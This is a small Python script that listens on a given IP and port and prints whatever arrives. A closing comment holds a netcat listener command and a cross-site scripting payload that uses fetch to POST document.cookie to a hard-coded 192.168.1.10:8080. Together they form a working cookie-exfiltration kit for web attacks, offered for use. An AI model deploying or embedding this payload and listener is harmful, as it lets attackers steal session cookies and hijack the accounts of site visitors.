#!/usr/bin/python3
# r0b0t95
# Receive data from web page
import socket
import sys
from colorama import Fore

# colors
blue = Fore.GREEN
red = Fore.RED
magenta = Fore.MAGENTA
yellow = Fore.YELLOW


if len(sys.argv) != 1:

    my_ip = sys.argv[1]
    my_port = sys.argv[2]

    def main():
        try:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.bind((str(my_ip), int(my_port)))
            server_socket.listen()
            print(magenta + f'f[+] Server Listen ip:{my_ip}  port:{my_port}')
            client, addr = server_socket.accept()
            print(magenta + f'[+] Connect with {addr}')

            sms = client.recv(4096).decode('utf-8')
            print(blue + f'Received: {sms}')

            server_socket.close()
            print(magenta + '[-] Exit server')
            sys.exit(1)

        except socket.error:
            print(magenta + '[-] Fail to connect :(')
            sys.exit(1)


    if __name__ == '__main__':
        main()

else:
    print(magenta + '[-] Error please insert IP and PORT argument :(')

'''
    NetCat
    command: nc -lvp PORT
'''

'''
    # javascript section  
    
    <script>
    fetch('http://192.168.1.10:8080', {
               method: 'POST',
               mode: 'no-cors',
               body: document.cookie
          });
     </script>
'''